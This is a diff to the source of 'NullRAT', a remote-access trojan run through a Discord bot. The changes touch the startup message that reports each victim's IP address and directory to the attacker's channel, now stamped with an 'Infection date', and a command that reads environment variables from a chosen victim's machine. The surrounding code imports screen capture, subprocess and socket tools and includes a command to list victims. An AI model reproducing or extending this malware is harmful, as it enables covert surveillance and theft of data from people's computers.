@@ -9,16 +9,27 @@ from mss import mss
 from requests import get, post
 from base64 import decodebytes,b64decode
 from socket import create_connection
-import os, subprocess, re, time, aiohttp
+import os, subprocess, re, time, aiohttp, datetime
 
 client, original_dir = commands.InteractionBot(test_guilds=server_ids), os.getcwd()
 nr_working = f"C:\\Users\\{os.getenv('username')}\\Music"
 
 @client.event
 async def on_ready():
-    await client.get_channel(notification_channel).send(
-        embed=Embed(title = f"NullRAT v8.4 started on {IP()}", description=f"Currently present in {original_dir}")
+    embed = Embed(
+        title = f"NullRAT v8.4 started on: **{IP()}**", 
+        description = f"Currently present in: **{original_dir}**",
+        timestamp = datetime.datetime.now()
     )
+    embed.set_author(
+        name="NullCode1337", 
+        url=r"http://nullcode1337.42web.io/", 
+        icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
+    )
+    embed.set_footer(
+        text = f"Infection date:"
+    )
+    await client.get_channel(notification_channel).send(embed=embed)
 
 # Intelligence Gathering #
 @client.slash_command(description="Lists the IP address of all victims")
@@ -29,7 +40,7 @@ async def listvictims(ctx):
     await ctx.response.send_message("Checking all available victims...")
 
 @client.slash_command(description="Finds the values of environment variables")
-async def get_environment(ctx, victim, env_var):
+async def getenv(ctx, victim, env_var):
     if str(victim) == str(IP()):
         try: value = os.getenv(env_var)
         except: return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!",color=0x0081FA))
